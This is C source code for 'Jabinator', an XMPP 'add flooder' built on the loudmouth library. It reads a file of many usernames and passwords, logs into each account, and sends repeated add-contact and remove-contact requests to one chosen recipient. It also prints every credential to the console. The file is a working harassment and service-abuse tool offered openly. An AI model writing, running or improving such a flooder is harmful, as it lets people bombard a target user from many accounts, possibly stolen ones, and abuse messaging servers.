#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <loudmouth/loudmouth.h>

#ifndef __LOUDMOUTH_H__
#   error "You're in need of the loudmouth library."
#   error "Arch:    pacman -S loudmouth"
#   error "Github:  https://github.com/mcabber/loudmouth"
#endif

#include <hdr/global.h>

GMainContext *main_context;

static gchar *authsfile = NULL;
static gint numthreads = 1;
static gchar *recipient = NULL;
static gchar *resource = "NULL";

static GOptionEntry entries[] =
{
    { "auths", 'a', 0, G_OPTION_ARG_STRING, &authsfile,
      "Authentications file list (e.g. auth.list)", NULL },
    { "threads", 't', 0, G_OPTION_ARG_STRING, &numthreads,
      "Number of threads to use [default=1]", NULL },
    { "recipient", 'R', 0, G_OPTION_ARG_STRING, &recipient,
      "Recipient to send the message to (e.g. user@server.org)", NULL },
    { "resource", 'r', 0, G_OPTION_ARG_STRING, &resource,
      "Resource to connect with [default=NULL]", NULL },
    { NULL }
};

int main(int argc, char **argv)
{
    FILE *fp;
    size_t len = 0;
    ssize_t read;
    char *line = NULL;

    GOptionContext *context;

    context = g_option_context_new("- Jabinator - Add flooder");
    g_option_context_add_main_entries(context, entries, NULL);
    g_option_context_parse(context, &argc, &argv, NULL);
    g_option_context_free(context);

    if(!authsfile || !recipient)
    {
        g_printerr("For usage, try %s --help\n", argv[0]);
        return EXIT_FAILURE;
    }

    if(recipient && strchr(recipient, '@') == NULL)
    {
        g_printerr("Username must have an '@' included\n");
        return EXIT_FAILURE;
    }

    fp = fopen(authsfile, "r");
    if(fp == NULL)
    {
        g_print("%s doesn't exist!\n", authsfile);
        return EXIT_FAILURE;
    }

    while((read = getline(&line, &len, fp)) != -1)
    {
        // TODO: Add threading

        LmConnection *lconnection;

        line[strcspn(line, "\n")] = 0;

        gchar *pubserv = strtok(line, "|");
        gchar *conserv = strtok(NULL, "|");
        gchar *username = strtok(NULL, "|");
        gchar *password = strtok(NULL, "|");
        gchar *conport = strtok(conserv, ":");
        conport = strtok(NULL, ":");

        printf("pubserv: %s, conserv: %s, username: %s, password: %s, conport: %s\n",
            pubserv, conserv, username, password, conport);

        gint jconport = (gint)atoi(conport);

        main_context = g_main_context_new();

        lconnection = xmpp_connect(pubserv, conserv, jconport,
            username, password, resource, FALSE);

        xmpp_addjid(recipient, lconnection);
        xmpp_deljid(recipient, lconnection);
    }

    return EXIT_SUCCESS;
}
